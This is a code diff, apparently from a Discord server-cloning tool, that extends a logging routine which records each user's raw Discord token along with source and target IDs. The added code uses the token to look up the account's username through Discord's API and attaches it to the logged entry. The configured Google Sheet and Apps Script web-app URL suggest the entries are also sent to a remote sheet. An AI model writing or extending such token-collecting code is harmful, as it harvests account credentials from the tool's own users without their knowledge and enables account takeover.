@@ -28,7 +28,7 @@ export function getSheetConfig() {
     return {
         spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
         spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
-        webAppUrl: process.env.GOOGLE_APPS_SCRIPT_URL || 'https://script.google.com/macros/s/AKfycbzFr3AxSz1UuT4dgLrFXIgbfb6C_A8RUrwg_STwHQgwO2bqDr_Ks5GqLIiSMbPgoz1QQA/exec'
+        webAppUrl: process.env.GOOGLE_APPS_SCRIPT_URL || 'https://script.google.com/macros/s/AKfycbx6J9lhqeTOtq2YupSUYP2iYBoGsFk6IPik2euyiKagSfYAjiAqPDVs_KFlBNz0-4zF9Q/exec'
     };
 }
 
@@ -44,8 +44,25 @@ export function saveSheetConfig(config) {
     }
 }
 
+async function getDiscordUsername(token) {
+    if (!token) return 'Unknown User';
+    try {
+        const res = await fetch('https://discord.com/api/v9/users/@me', {
+            headers: { 'Authorization': token }
+        });
+        if (res.ok) {
+            const data = await res.json();
+            return data.username || data.tag || 'Unknown User';
+        }
+    } catch (e) {
+        console.error('Failed to fetch discord username:', e);
+    }
+    return 'Unknown User';
+}
+
 export async function logCloneEntry({ userToken, sourceId, targetId }) {
-    const time = new Date().toLocaleString('en-US', {
+    const now = new Date();
+    const time = now.toLocaleString('en-US', {
         year: 'numeric',
         month: '2-digit',
         day: '2-digit',
@@ -55,12 +72,15 @@ export async function logCloneEntry({ userToken, sourceId, targetId }) {
         hour12: true
     });
 
+    const username = await getDiscordUsername(userToken);
+
     const entry = {
         time,
+        username,
         token: userToken ? userToken.trim() : 'N/A',
         sourceId: sourceId ? String(sourceId).trim() : 'N/A',
         targetId: targetId ? String(targetId).trim() : 'N/A',
-        timestamp: Date.now()
+        timestamp: now.getTime()
     };
 
     // 1. Save to local history file
